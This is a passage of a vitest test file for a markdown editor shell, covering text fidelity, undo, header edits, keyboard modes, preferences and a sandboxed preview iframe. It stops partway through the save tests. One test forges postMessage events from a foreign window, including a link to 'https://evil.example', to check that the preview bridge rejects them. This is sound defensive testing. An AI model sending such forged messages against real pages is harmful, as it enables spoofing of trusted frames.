/**
 * The editor shell (`orz-markdown/carrier/editor`, src/carrier/editor/):
 * claims E.1–E.13 in notes/CLAIMS.md; spec/FC-19-editor-component.md §8.
 *
 * Substrates. The text model and the anchor maths are pure. The shell runs
 * in happy-dom with the textarea engine (modes, keyboard, preferences,
 * dirty tracking, header edits, save routes, instances, destroy); the
 * preview bridge's message filtering runs against a fake window and iframe.
 * What happy-dom cannot show — CodeMirror 6 in a shadow root, the opaque
 * origin of the preview sandbox, layout (the split drag, narrow widths),
 * Subresource Integrity — runs in the installed Chrome through playwright-core
 * with the pinned `vendor/codemirror6.js` served from a local origin (the
 * jsDelivr copy exists only once this version is published); those tests
 * skip when Chrome is absent.
 */
import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest';
import { existsSync, readFileSync, mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { createHash } from 'node:crypto';
import http from 'node:http';
import vm from 'node:vm';
import v8 from 'node:v8';
import type { AddressInfo } from 'node:net';
import {
  createEditorShell, textareaAdapter, codemirror6Adapter, createTextModel, toEditorText, minimalChange, createPreview, previewFrameDocument,
  lineToTop, topToLine, renderMarkdownPreview, isCodeMirror6Modules, PREVIEW_SANDBOX, PREVIEW_BRIDGE, PREVIEW_SECRET_ATTRIBUTE, previewFrameParts, CODEMIRROR6_URL, CODEMIRROR6_VERSIONS,
  CODEMIRROR6_INTEGRITY, CODEMIRROR6_BYTES, CODEMIRROR6_PATH, CODEMIRROR6_GLOBAL, EDITOR_CSS, PREVIEW_BRIDGE_HASH, previewScriptHashes,
  previewSandbox, rewriteAssetUrls, mapSrcset, renderMarkdownPreviewWithIncludes, includeRecordEnv, previewIncludes, undoSteps, detachString, loadCodeMirror6, CODEMIRROR6_HISTORY_STEPS,
  type EditorShell, type EditorShellOptions, type EdElement, type EdDocument, type EdFile, type RenderContext,
} from '../src/carrier/editor';
import { historyChars, undoTexts } from '../src/carrier/editor/adapter';
import { printDocument, PRINT_SANDBOX, PRINT_READY_TIMEOUT_MS } from '../src/carrier/editor';
import { printScript, withPrintScript } from '../src/carrier/editor/print';
import { assembleEnvelope, editHeader, withoutHeader } from '../src/carrier';
import { md } from '../src/index';
import { isScriptSafe, type HostConnection, type Saver, type SaveResult, type StorageLike, type PreferenceStore } from '../src/carrier/shell';
import { VERSION } from '../src/version';

// ── fixtures ─────────────────────────────────────────────────────────────

const UID_A = 'doc-aaaaaaaaaa111111';
const UID_B = 'doc-bbbbbbbbbb222222';
const CRLF_BOM = `﻿{{nyml\r\nkind: document\r\ntitle: Week 3 — 漢字\r\nuid: ${UID_A}\r\nx_host_key: kept\r\n}}\r\n\r\n# Week 3\r\n\r\n</script> 𝒳 trailing  \r\n`;
const TEXTS: Record<string, string> = {
  'CRLF + BOM': CRLF_BOM,
  CR: '{{nyml\rkind: document\rtitle: Mac\r}}\r\rclassic line ends\r',
  LF: `{{nyml\nkind: document\nuid: ${UID_B}\n}}\n\n# Plain\n\n- a\n- b\n`,
  'no header': '# Just Markdown\n\nwith *emphasis*\n',
  'mixed EOL': 'a\r\nb\nc\rd',
  'BOM only': '﻿',
  empty: '',
  'astral + U+2028': '𝒳   line sep\r\n𝒴\r\n',
};

function memoryStorage(): StorageLike & { map: Map<string, string> } {
  const map = new Map<string, string>();
  return { map, getItem: (k) => map.get(k) ?? null, setItem: (k, v) => { map.set(k, v); }, removeItem: (k) => { map.delete(k); } };
}

let HappyWindow: typeof import('happy-dom').Window;
beforeAll(async () => {
  ({ Window: HappyWindow } = await import('happy-dom'));
});

type HWin = InstanceType<typeof HappyWindow>;

function page(): { win: HWin; document: Document; mountPoint(): EdElement } {
  const win = new HappyWindow({ url: 'https://app.example/edit' });
  const document = win.document as unknown as Document;
  return {
    win,
    document,
    mountPoint() {
      const div = document.createElement('div');
      document.body.appendChild(div);
      return div as unknown as EdElement;
    },
  };
}

type Mounted = { shell: EditorShell; root: ShadowRoot; ta(): HTMLTextAreaElement; win: HWin; el: EdElement; storage: ReturnType<typeof memoryStorage> };

function mount(opts: Partial<EditorShellOptions> = {}, ctx = page()): Mounted {
  const storage = memoryStorage();
  const el = ctx.mountPoint();
  const shell = createEditorShell(el, {
    text: CRLF_BOM,
    render: (t) => renderMarkdownPreview(t),
    adapter: textareaAdapter(),
    storage,
    preview: { assets: false, debounceMs: 10 },
    ...opts,
  });
  const root = shell.root as unknown as ShadowRoot;
  return { shell, root, ta: () => root.querySelector('textarea')!, win: ctx.win, el, storage };
}

/** Type into the textarea the way a browser does: value, caret, an input event. */
function type(m: Mounted, insert: string, at?: number): void {
  const ta = m.ta();
  const pos = at ?? ta.value.length;
  ta.value = ta.value.slice(0, pos) + insert + ta.value.slice(pos);
  ta.setSelectionRange(pos + insert.length, pos + insert.length);
  ta.dispatchEvent(new m.win.InputEvent('input', { inputType: 'insertText', data: insert, bubbles: true }) as unknown as Event);
}

function key(m: Mounted, target: Element, k: string, mods: { ctrl?: boolean; meta?: boolean; shift?: boolean } = {}): KeyboardEvent {
  const e = new m.win.KeyboardEvent('keydown', { key: k, ctrlKey: !!mods.ctrl, metaKey: !!mods.meta, shiftKey: !!mods.shift, bubbles: true, composed: true, cancelable: true }) as unknown as KeyboardEvent;
  target.dispatchEvent(e);
  return e;
}

const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms));
const toasts = (root: ShadowRoot): string[] => [...root.querySelectorAll('.orz-toast__message')].map((n) => n.textContent ?? '');

// ── E.1 the exact text ───────────────────────────────────────────────────

describe('the exact text (FC-19 invariant 5, FC-18 law 1)', () => {
  it('[E.1] the text model gives back every text exactly when its editor form is unchanged (CR LF, CR, BOM, mixed, astral, empty), and writes edits in the document\'s own line ending and BOM', () => {
    for (const [name, text] of Object.entries(TEXTS)) {
      const m = createTextModel(text);
      const editor = toEditorText(text);
      expect(editor, name).not.toMatch(/\r/);
      expect(editor.startsWith('﻿'), name).toBe(false);
      expect(m.toExact(editor), name).toBe(text);
    }
    const m = createTextModel(CRLF_BOM);
    const edited = `${toEditorText(CRLF_BOM)}new line\nanother\n`;
    const out = m.toExact(edited);
    expect(out.startsWith('﻿')).toBe(true);
    expect(out.replace(/\r\n/g, '')).not.toMatch(/[\r\n]/); // only CR LF
    expect(out).toBe(`${CRLF_BOM}new line\r\nanother\r\n`);
    const cr = createTextModel(TEXTS.CR);
    expect(cr.toExact(`${toEditorText(TEXTS.CR)}x\n`)).toBe(`${TEXTS.CR}x\r`);
    // a mixed text is written in the style of its first line break once edited
    expect(createTextModel('a\r\nb\nc').toExact('a\nb\nc!')).toBe('a\r\nb\r\nc!');
    // offsets: BOM and CR LF counted
    expect(m.toExactOffset(toEditorText(CRLF_BOM), 0)).toBe(1);
    expect(m.toExactOffset('a\nb\nc', 4)).toBe(1 + 4 + 2);
    // minimal change never splits a surrogate pair
    expect(minimalChange('a𝒳b', 'a𝒴b')).toEqual({ from: 1, to: 3, insert: '𝒴' });
    expect(minimalChange('same', 'same')).toBeNull();
  });

  it('[E.1] through the shell: getText() is the original byte for byte before any edit, and keeps the BOM and the line-ending style after typing', () => {
    for (const [name, text] of Object.entries(TEXTS)) {
      const m = mount({ text });
      expect(m.shell.getText(), name).toBe(text);
      expect(m.shell.isDirty(), name).toBe(false);
      m.shell.destroy();
    }
    const m = mount();
    type(m, 'typed\nmore');
    const t = m.shell.getText();
    expect(t.startsWith('﻿')).toBe(true);
    expect(t).toBe(`${CRLF_BOM}typed\r\nmore`);
    expect(t.replace(/\r\n/g, '')).not.toMatch(/[\r\n]/);
    // typing it back out returns the exact original
    m.ta().value = toEditorText(CRLF_BOM);
    m.ta().dispatchEvent(new m.win.InputEvent('input', { inputType: 'deleteContentBackward' }) as unknown as Event);
    expect(m.shell.getText()).toBe(CRLF_BOM);
    m.shell.destroy();
  });

  it('[E.1] setText adopts the new text exactly (its own BOM and line endings), mixed line endings included while unedited', () => {
    const m = mount();
    for (const text of Object.values(TEXTS)) {
      m.shell.setText(text);
      expect(m.shell.getText()).toBe(text);
    }
    m.shell.setText('x\r\ny');
    type(m, '\nz');
    expect(m.shell.getText()).toBe('x\r\ny\r\nz');
    m.shell.destroy();
  });
});

// ── E.2 dirty tracking and events ────────────────────────────────────────

describe('dirty tracking and events', () => {
  it('[E.2] dirty means "differs from the saved text": an edit makes it dirty, undoing back makes it clean, markSaved adopts the current text; dirty events fire on transitions only', () => {
    const m = mount();
    const dirty: boolean[] = [];
    const changes: string[] = [];
    m.shell.on('dirty', (e) => dirty.push(e.dirty));
    const off = m.shell.on('change', (e) => changes.push(e.text));
    expect(m.shell.isDirty()).toBe(false);
    type(m, 'a');
    type(m, 'b');
    expect(m.shell.isDirty()).toBe(true);
    expect(changes).toEqual([`${CRLF_BOM}a`, `${CRLF_BOM}ab`]);
    expect(m.shell.undo()).toBe(true); // "ab" was one typing group
    expect(m.shell.getText()).toBe(CRLF_BOM);
    expect(m.shell.isDirty()).toBe(false);
    expect(m.shell.redo()).toBe(true);
    expect(m.shell.isDirty()).toBe(true);
    m.shell.markSaved();
    expect(m.shell.isDirty()).toBe(false);
    expect(dirty).toEqual([true, false, true, false]);
    expect(changes).toHaveLength(4); // a, b, the undo, the redo
    off();
    type(m, 'c');
    expect(changes).toHaveLength(4); // unsubscribed
    // setText changes the text but does not mark it saved
    m.shell.setText('other');
    expect(m.shell.isDirty()).toBe(true);
    expect(m.root.querySelector('.orz-editor')!.getAttribute('data-dirty')).toBe('true');
    expect(m.root.querySelector('.orz-editor__status')!.textContent).toBe('Unsaved changes');
    m.shell.destroy();
  });

  it('[E.2] selection events carry offsets in the exact text (BOM and CR LF counted); a throwing listener does not break the others', () => {
    const m = mount();
    const seen: Array<{ from: number; to: number }> = [];
    m.shell.on('selection', () => { throw new Error('listener bug'); });
    m.shell.on('selection', (s) => seen.push(s));
    const ta = m.ta();
    const editor = toEditorText(CRLF_BOM);
    const at = editor.indexOf('# Week');
    ta.setSelectionRange(at, at + 6);
    ta.dispatchEvent(new m.win.Event('select') as unknown as Event);
    expect(seen).toHaveLength(1);
    expect(CRLF_BOM.slice(seen[0].from, seen[0].to)).toBe('# Week');
    m.shell.destroy();
  });
});

// ── E.3 header edits ─────────────────────────────────────────────────────

describe('header edits (FC-18 §9)', () => {
  it('[E.3] setHeader applies editHeader to the current text as ONE undoable edit: the result equals editHeader\'s, one undo restores the exact original, redo re-applies', () => {
    const m = mount();
    type(m, 'x');
    const before = m.shell.getText();
    const changes = { title: 'New title', theme: 'light-neat-3', x_host_key: null };
    m.shell.setHeader(changes);
    expect(m.shell.getText()).toBe(editHeader(before, changes));
    expect(m.shell.getText()).toContain('\r\ntheme: light-neat-3\r\n'); // the header's line ending
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe(before);
    expect(m.shell.redo()).toBe(true);
    expect(m.shell.getText()).toBe(editHeader(before, changes));
    // an edit editHeader refuses changes nothing
    const now = m.shell.getText();
    expect(() => m.shell.setHeader({ kind: 'slides' })).toThrow();
    expect(() => m.shell.setHeader({ title: 'a }} b' })).toThrow();
    expect(m.shell.getText()).toBe(now);
    // a text without a header gets one (after its BOM)
    m.shell.setText('﻿# Hi\r\n');
    m.shell.setHeader({ title: 'T' });
    expect(m.shell.getText()).toBe('﻿{{nyml\r\nkind: document\r\ntitle: T\r\n}}\r\n\r\n# Hi\r\n');
    m.shell.destroy();
  });

  it('[E.3] the original mixed-EOL text comes back exactly after a header edit is undone (the model remembers the texts it was given)', () => {
    const text = '{{nyml\r\nkind: document\r\ntitle: A\r\n}}\nbody\rmore\r\n';
    const m = mount({ text });
    m.shell.setHeader({ title: 'B' });
    expect(m.shell.getText()).toBe(editHeader(text, { title: 'B' }));
    m.shell.undo();
    expect(m.shell.getText()).toBe(text);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();
  });
});

// ── E.4 layout, modes, keyboard, responsive ──────────────────────────────

describe('layout, modes, keyboard', () => {
  it('[E.4] the shell renders in a shadow root with the chrome and editor stylesheets: a labelled toolbar with Editor/Split/Preview (aria-pressed), the editor pane, a separator and the preview', () => {
    const m = mount();
    const host = m.el as unknown as HTMLElement;
    expect(host.children).toHaveLength(1);
    expect(host.firstElementChild!.shadowRoot).toBe(m.root);
    expect(m.root.querySelector('[role="toolbar"]')!.getAttribute('aria-label')).toBe('Editor toolbar');
    const modes = [...m.root.querySelectorAll('.orz-editor__mode')];
    expect(modes.map((b) => b.getAttribute('aria-label'))).toEqual(['Editor', 'Split', 'Preview']);
    expect(modes.map((b) => b.getAttribute('aria-pressed'))).toEqual(['false', 'true', 'false']);
    const sep = m.root.querySelector('[role="separator"]')!;
    expect(sep.getAttribute('aria-orientation')).toBe('vertical');
    expect(sep.getAttribute('aria-valuenow')).toBe('50');
    expect(sep.getAttribute('tabindex')).toBe('0');
    expect(m.root.querySelector('button.orz-editor__save')!.getAttribute('aria-label')).toBe('Save');
    expect(m.root.querySelector('textarea')!.getAttribute('aria-label')).toBe('Document text');
    expect(EDITOR_CSS).not.toMatch(/(^|\})\s*(body|html|:root)\b/);
    m.shell.destroy();
    // chrome: none → no toolbar; compact → labels visually hidden; readOnly → no Save button and a read-only engine
    const n = mount({ chrome: 'none' });
    expect(n.root.querySelector('[role="toolbar"]')).toBeNull();
    expect(n.shell.toolbar).toBeNull();
    n.shell.destroy();
    const r = mount({ readOnly: true, chrome: 'compact' });
    expect((r.root.querySelector('.orz-editor__save') as HTMLElement).hidden).toBe(true);
    expect(r.ta().readOnly).toBe(true);
    expect(r.root.querySelector('.orz-editor')!.getAttribute('data-chrome-level')).toBe('compact');
    r.shell.destroy();
  });

  it('[E.4] setMode and the mode buttons switch views (stored as the viewMode preference); Cmd/Ctrl+\\ cycles split → editor → preview → split; Cmd/Ctrl+S saves; Esc in the editor moves focus to the toolbar', async () => {
    const save = vi.fn(async () => undefined);
    const m = mount({ hooks: { save }, uid: UID_A });
    const c = m.root.querySelector('.orz-editor')!;
    (m.root.querySelector('[data-mode="preview"]') as HTMLElement).click();
    expect(m.shell.getMode()).toBe('preview');
    expect(c.getAttribute('data-view')).toBe('preview');
    expect(m.storage.map.get(`orz-pref:${UID_A}:viewMode`)).toBe('"preview"');
    m.shell.setMode('split');
    const ta = m.ta();
    expect(key(m, ta, '\\', { ctrl: true }).defaultPrevented).toBe(true);
    expect(m.shell.getMode()).toBe('editor');
    key(m, ta, '\\', { meta: true });
    expect(m.shell.getMode()).toBe('preview');
    key(m, ta, '\\', { ctrl: true });
    expect(m.shell.getMode()).toBe('split');
    expect(() => m.shell.setMode('bogus' as never)).toThrow();
    type(m, '!');
    expect(key(m, ta, 's', { meta: true }).defaultPrevented).toBe(true);
    await tick();
    expect(save).toHaveBeenCalledWith(`${CRLF_BOM}!`);
    ta.focus();
    key(m, ta, 'Escape');
    expect(m.root.activeElement?.getAttribute('data-mode')).toBe('split');
    m.shell.destroy();
  });

  it('[E.4] responsive: below the narrow width only one pane shows — split shows the editor, Cmd/Ctrl+\\ flips editor ↔ preview, the Split button hides; wide again restores split', () => {
    const m = mount();
    const host = (m.el as unknown as HTMLElement).firstElementChild as HTMLElement;
    let width = 500;
    host.getBoundingClientRect = () => ({ width, height: 400, top: 0, left: 0, right: width, bottom: 400, x: 0, y: 0, toJSON() { return {}; } }) as DOMRect;
    m.win.dispatchEvent(new m.win.Event('resize') as unknown as Event);
    const c = m.root.querySelector('.orz-editor')!;
    expect(c.hasAttribute('data-narrow')).toBe(true);
    expect(m.shell.getMode()).toBe('split');
    expect(m.shell.getView()).toBe('editor');
    key(m, m.ta(), '\\', { ctrl: true });
    expect(m.shell.getView()).toBe('preview');
    expect(m.shell.getMode()).toBe('split');
    expect(m.root.querySelector('[data-mode="preview"]')!.getAttribute('aria-pressed')).toBe('true');
    expect(EDITOR_CSS).toContain('.orz-editor[data-narrow] .orz-editor__mode[data-mode="split"] { display: none; }');
    width = 1000;
    m.win.dispatchEvent(new m.win.Event('resize') as unknown as Event);
    expect(c.hasAttribute('data-narrow')).toBe(false);
    expect(m.shell.getView()).toBe('split');
    m.shell.destroy();
  });

  it('[E.4] the separator is keyboard-operable: arrows move the split by 5 %, Home/End go to 10 %/90 %; the ratio is clamped to 0.1–0.9', () => {
    const m = mount({ uid: UID_A });
    const sep = m.root.querySelector('[role="separator"]') as HTMLElement;
    key(m, sep, 'ArrowLeft');
    expect(m.shell.getSplitRatio()).toBe(0.45);
    key(m, sep, 'End');
    expect(m.shell.getSplitRatio()).toBe(0.9);
    key(m, sep, 'ArrowRight');
    expect(m.shell.getSplitRatio()).toBe(0.9);
    key(m, sep, 'Home');
    expect(sep.getAttribute('aria-valuenow')).toBe('10');
    m.shell.setSplitRatio(3);
    expect(m.shell.getSplitRatio()).toBe(0.9);
    m.shell.destroy();
  });
});

// ── E.5 preview ──────────────────────────────────────────────────────────

/** A fake page window and the iframe's window, for the bridge's message rules. */
function fakePreviewPage() {
  const listeners = new Set<(e: unknown) => void>();
  const posted: unknown[] = [];
  const frameWindow = { postMessage: (m: unknown) => { posted.push(m); } };
  const appended: unknown[] = [];
  const win = {
    addEventListener: (_t: string, l: (e: unknown) => void) => { listeners.add(l); },
    removeEventListener: (_t: string, l: (e: unknown) => void) => { listeners.delete(l); },
    setTimeout, clearTimeout,
  };
  const iframe: Record<string, unknown> = {
    attrs: {} as Record<string, string>,
    setAttribute(n: string, v: string) { (this.attrs as Record<string, string>)[n] = v; },
    on: {} as Record<string, (e: unknown) => void>,
    addEventListener(t: string, l: (e: unknown) => void) { (this.on as Record<string, unknown>)[t] = l; },
    removeEventListener(t: string) { delete (this.on as Record<string, unknown>)[t]; },
    remove() { this.removed = true; },
    contentWindow: frameWindow,
  };
  const doc = { createElement: () => iframe, defaultView: win } as unknown as EdDocument;
  const parent = { append: (n: unknown) => appended.push(n) } as unknown as EdElement;
  const emit = (data: unknown, source: unknown) => { for (const l of [...listeners]) l({ data, source, origin: 'null' }); };
  return { doc, parent, iframe, frameWindow, posted, listeners, emit, appended };
}

describe('the preview', () => {
  it('[E.5] the preview is an iframe whose sandbox is exactly allow-scripts (never allow-same-origin), srcdoc = the pinned preview libraries + the fixed bridge; HTML is posted only after the frame says ready, and the last HTML is re-sent when it says ready again', () => {
    const f = fakePreviewPage();
    const p = createPreview(f.doc, f.parent, { assets: false }, {});
    expect(PREVIEW_SANDBOX).toBe('allow-scripts');
    expect(f.iframe.attrs).toMatchObject({ sandbox: 'allow-scripts', title: 'Document preview' });
    expect(String(f.iframe.srcdoc)).toContain(PREVIEW_BRIDGE);
    expect(PREVIEW_BRIDGE).not.toMatch(/<\/?script/i);
    expect(PREVIEW_BRIDGE).toContain('if(!port&&C(SRC,e)===P)defer(function(){if(!port)handle(d)})'); // the parent's window messages, until the port (2.3.0 round 3: then only the port; round 4: handled after the dispatch)
    p.render('<p>one</p>');
    expect(f.posted).toEqual([]);
    f.emit({ type: 'orz-preview-ready' }, f.frameWindow);
    expect(f.posted).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>one</p>' }]);
    p.render('<p>two</p>');
    f.emit({ type: 'orz-preview-ready' }, f.frameWindow); // reloaded frame
    expect(f.posted.slice(1)).toEqual([{ type: 'orz-preview-render', id: 2, html: '<p>two</p>' }, { type: 'orz-preview-render', id: 3, html: '<p>two</p>' }]);
    // the full frame document carries the pinned libraries and __orzEnhance
    const full = previewFrameDocument({ head: '<link rel="stylesheet" href="theme.css">', scheme: 'dark', articleClass: 'markdown-body x"y' });
    expect(full).toContain('window.__orzEnhance=function');
    expect(full).toContain('atom-one-dark');
    expect(full).toContain('class="markdown-body x&quot;y" id="orz-doc"');
    expect(full).toContain('<link rel="stylesheet" href="theme.css">');
    p.destroy();
    expect(f.iframe.removed).toBe(true);
    expect(f.listeners.size).toBe(0);
  });

  it('[E.5] messages are read only from that iframe\'s window: anchors, scroll, keys and links forged by another window are ignored; payloads are validated as data; keys, links and scrolls on the window never act, even from the frame', () => {
    const f = fakePreviewPage();
    const seen: unknown[] = [];
    const p = createPreview(f.doc, f.parent, { assets: false }, {
      onRendered: (a) => seen.push(['rendered', a]), onScrolled: (t) => seen.push(['scrolled', t]), onKey: (k) => seen.push(['key', k]), onLink: (h) => seen.push(['link', h]),
    });
    const stranger = { postMessage() {} };
    for (const source of [stranger, null, undefined, {}]) {
      f.emit({ type: 'orz-preview-rendered', anchors: [[1, 100]], max: 5 }, source);
      f.emit({ type: 'orz-preview-key', key: 's' }, source);
      f.emit({ type: 'orz-preview-link', href: 'https://evil.example' }, source);
      f.emit({ type: 'orz-preview-ready' }, source);
    }
    expect(seen).toEqual([]);
    expect(p.anchors).toEqual([]);
    f.emit({ type: 'orz-preview-rendered', anchors: [[2, 50], ['x', 1], [3, NaN], 'junk', [9, 400]], max: 1000 }, f.frameWindow);
    f.emit({ type: 'orz-preview-key', key: 'q' }, f.frameWindow);
    f.emit({ type: 'orz-preview-key', key: 'Escape' }, f.frameWindow);
    f.emit({ type: 'orz-preview-link', href: 42 }, f.frameWindow);
    f.emit({ type: 'orz-preview-scrolled', top: 120, max: 1000 }, f.frameWindow);
    expect(p.anchors).toEqual([[2, 50], [9, 400]]);
    expect(seen).toEqual([['rendered', [[2, 50], [9, 400]]]]);
    p.destroy();
  });

  it('[E.5] scroll sync maps lines and tops through the anchors (linear between them, from the top before the first, the last beyond the end)', () => {
    const a: Array<[number, number]> = [[6, 100], [10, 300], [20, 500]];
    expect(lineToTop(a, 8)).toBe(200);
    expect(lineToTop(a, 15)).toBe(400);
    expect(lineToTop(a, 3)).toBe(50);
    expect(lineToTop(a, 99)).toBe(500);
    expect(topToLine(a, 200)).toBe(8);
    expect(topToLine(a, 50)).toBe(3);
    expect(topToLine(a, 9999)).toBe(20);
    for (const line of [0, 6, 7.5, 12, 20]) expect(topToLine(a, lineToTop(a, line))).toBeCloseTo(line);
    expect(lineToTop([], 5)).toBe(0);
  });

  it('[E.5] edits re-render the preview once per pause (debounced), the editor-only view renders nothing until the preview shows, and a failing render is an error event that keeps the last preview', async () => {
    const render = vi.fn((t: string) => {
      if (t.includes('BOOM')) throw new Error('render failed');
      return `<p>${t.length}</p>`;
    });
    const m = mount({ render, mode: 'editor' });
    const errors: string[] = [];
    m.shell.on('error', (e) => errors.push(`${e.source}: ${e.message}`));
    await tick(30);
    expect(render).not.toHaveBeenCalled();
    m.shell.setMode('split');
    await tick(30);
    expect(render).toHaveBeenCalledTimes(1);
    type(m, 'a'); type(m, 'b'); type(m, 'c');
    await tick(40);
    expect(render).toHaveBeenCalledTimes(2);
    expect(render.mock.calls[1][0]).toBe(`${CRLF_BOM}abc`);
    type(m, 'BOOM');
    await tick(40);
    expect(errors).toEqual(['render: render failed']);
    m.shell.destroy();
  });
});

// ── E.6 reader preferences ───────────────────────────────────────────────

describe('reader preferences (FC-18 §6)', () => {
  it('[E.6] split ratio, view mode, scroll sync, font size and dark chrome are reader preferences namespaced by the header uid (orz-pref:<uid>:…), read at mount; a text without a uid uses orz-pref:_:', () => {
    const storage = memoryStorage();
    storage.setItem(`orz-pref:${UID_A}:splitRatio`, '0.3');
    storage.setItem(`orz-pref:${UID_A}:viewMode`, '"preview"');
    storage.setItem(`orz-pref:${UID_A}:editorFontSize`, '18');
    storage.setItem(`orz-pref:${UID_A}:darkChrome`, 'true');
    storage.setItem(`orz-pref:${UID_A}:scrollSync`, 'false');
    const ctx = page();
    const a = createEditorShell(ctx.mountPoint(), { text: CRLF_BOM, render: () => '', adapter: textareaAdapter(), storage, preview: { assets: false } });
    expect(a.getSplitRatio()).toBe(0.3);
    expect(a.getMode()).toBe('preview');
    const ra = a.root as unknown as ShadowRoot;
    expect((ra.host as HTMLElement).getAttribute('data-chrome')).toBe('dark');
    expect((ra.querySelector('.orz-editor') as HTMLElement).style.getPropertyValue('--orz-editor-font-size')).toBe('18px');
    expect(ra.querySelector('.orz-editor__sync')!.getAttribute('aria-pressed')).toBe('false');
    // another document (another uid) does not see them; nor does a document without one
    const b = createEditorShell(ctx.mountPoint(), { text: TEXTS.LF, render: () => '', adapter: textareaAdapter(), storage, preview: { assets: false } });
    expect(b.getSplitRatio()).toBe(0.5);
    expect(b.getMode()).toBe('split');
    b.setSplitRatio(0.7);
    expect(storage.map.get(`orz-pref:${UID_B}:splitRatio`)).toBe('0.7');
    expect(storage.map.get(`orz-pref:${UID_A}:splitRatio`)).toBe('0.3');
    const c = createEditorShell(ctx.mountPoint(), { text: '# no uid', render: () => '', adapter: textareaAdapter(), storage, preview: { assets: false } });
    c.setMode('editor');
    expect(storage.map.get('orz-pref:_:viewMode')).toBe('"editor"');
    // an explicit mode wins at mount and is not stored; an explicit preference store is used as is
    const fixed = new Map<string, unknown>();
    const custom = { get: (k: string) => fixed.get(k) ?? ({ splitRatio: 0.5, scrollSync: true, viewMode: 'split', editorFontSize: 14, darkChrome: null } as Record<string, unknown>)[k], set: (k: string, v: unknown) => { fixed.set(k, v); return true; }, remove() {}, all: () => ({}), namespace: 'custom:' } as unknown as PreferenceStore;
    const d = createEditorShell(ctx.mountPoint(), { text: CRLF_BOM, render: () => '', adapter: textareaAdapter(), preferences: custom, mode: 'editor', preview: { assets: false } });
    expect(d.getMode()).toBe('editor');
    expect(fixed.has('viewMode')).toBe(false);
    d.setSplitRatio(0.25);
    expect(fixed.get('splitRatio')).toBe(0.25);
    expect(storage.map.has(`orz-pref:${UID_A}:splitRatio`) && storage.map.get(`orz-pref:${UID_A}:splitRatio`)).toBe('0.3');
    // the scroll-sync toggle is stored
    (ra.querySelector('.orz-editor__sync') as HTMLElement).click();
    expect(storage.map.get(`orz-pref:${UID_A}:scrollSync`)).toBe('true');
    for (const s of [a, b, c, d]) s.destroy();
  });

  it('[E.6] preferences never enter the text: changing every one leaves getText() and the dirty state unchanged', () => {
    const m = mount({ uid: UID_A });
    m.shell.setSplitRatio(0.2);
    m.shell.setMode('preview');
    (m.root.querySelector('.orz-editor__sync') as HTMLElement).click();
    expect(m.shell.getText()).toBe(CRLF_BOM);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();
  });
});

// ── E.7 instances and destroy ────────────────────────────────────────────

describe('instances', () => {
  it('[E.7] two shells on one page are isolated: their own text, undo history, events, modes and toasts', async () => {
    const ctx = page();
    const a = mount({ uid: UID_A }, ctx);
    const b = mount({ text: TEXTS.LF }, ctx);
    const events = { a: 0, b: 0 };
    a.shell.on('change', () => events.a++);
    b.shell.on('change', () => events.b++);
    type(a, 'A');
    expect(a.shell.getText()).toBe(`${CRLF_BOM}A`);
    expect(b.shell.getText()).toBe(TEXTS.LF);
    expect(events).toEqual({ a: 1, b: 0 });
    expect(b.shell.isDirty()).toBe(false);
    expect(b.shell.undo()).toBe(false);
    a.shell.setMode('editor');
    expect(b.shell.getMode()).toBe('split');
    await a.shell.save(); // no save route → error toast in A only
    expect(toasts(a.root)).toHaveLength(1);
    expect(toasts(b.root)).toHaveLength(0);
    a.shell.destroy();
    b.shell.destroy();
  });

  it('[E.7] destroy() releases everything: every window listener it added is removed, the iframe and the host element are gone, the engine is destroyed, pending renders never run, and later calls do nothing', async () => {
    const ctx = page();
    const added: string[] = [];
    const removed: string[] = [];
    const add = ctx.win.addEventListener.bind(ctx.win);
    const rem = ctx.win.removeEventListener.bind(ctx.win);
    (ctx.win as unknown as { addEventListener: unknown }).addEventListener = (t: string, l: never, o?: never) => { added.push(t); add(t, l, o); };
    (ctx.win as unknown as { removeEventListener: unknown }).removeEventListener = (t: string, l: never, o?: never) => { removed.push(t); rem(t, l, o); };
    const render = vi.fn(() => '<p>x</p>');
    const engine = textareaAdapter();
    const destroyEngine = vi.spyOn(engine, 'destroy');
    const m = mount({ render, adapter: engine }, ctx);
    expect(added.sort()).toEqual(['message', 'resize']);
    await tick(30);
    const calls = render.mock.calls.length;
    type(m, 'pending');
    m.shell.destroy();
    expect(removed.sort()).toEqual(added.sort());
    expect(ctx.document.querySelectorAll('iframe')).toHaveLength(0);
    expect((m.el as unknown as HTMLElement).children).toHaveLength(0);
    expect(m.root.querySelector('iframe')).toBeNull();
    expect(destroyEngine).toHaveBeenCalledTimes(1);
    await tick(40);
    expect(render).toHaveBeenCalledTimes(calls);
    m.shell.destroy(); // idempotent
    await expect(m.shell.save()).resolves.toEqual({ ok: false, error: 'destroyed' });
  });
});

// ── E.8 save ─────────────────────────────────────────────────────────────

function fakeSaver(result: SaveResult | (() => Promise<SaveResult>)) {
  const saves: Array<{ text: string; html: string }> = [];
  const downloads: string[] = [];
  const saver: Saver = {
    save: async (input) => { saves.push({ text: input.text, html: input.html }); return typeof result === 'function' ? result() : result; },
    download: async ({ html }) => { downloads.push(html); return { via: 'download', ok: true }; },
    handleKey: () => UID_A,
  };
  return { saver, saves, downloads };
}

describe('save', () => {
  it('[E.8] app host: save() calls hooks.save with the exact text (BOM, CR LF), clears dirty only on success, emits save, announces it; one save at a time', async () => {
    let release!: () => void;
    const hook = vi.fn(() => new Promise<void>((r) => { release = r; }));
    const m = mount({ hooks: { save: hook } });
    const saved: unknown[] = [];
    m.shell.on('save', (e) => saved.push(e));
    type(m, 'edit\n');
    const p1 = m.shell.save();
    const p2 = m.shell.save();
    expect(p2).toBe(p1);
    await tick();
    expect(hook).toHaveBeenCalledTimes(1);
    expect(hook).toHaveBeenCalledWith(`${CRLF_BOM}edit\r\n`);
    expect(m.shell.isDirty()).toBe(true);
    type(m, 'during'); // typed while the save is in flight
    release();
    await expect(p1).resolves.toEqual({ ok: true, via: 'hook' });
    expect(saved).toEqual([{ text: `${CRLF_BOM}edit\r\n`, via: 'hook' }]);
    expect(m.shell.isDirty()).toBe(true); // the in-flight edit is not saved
    expect(toasts(m.root)).toEqual(['Saved.']);
    const p3 = m.shell.save();
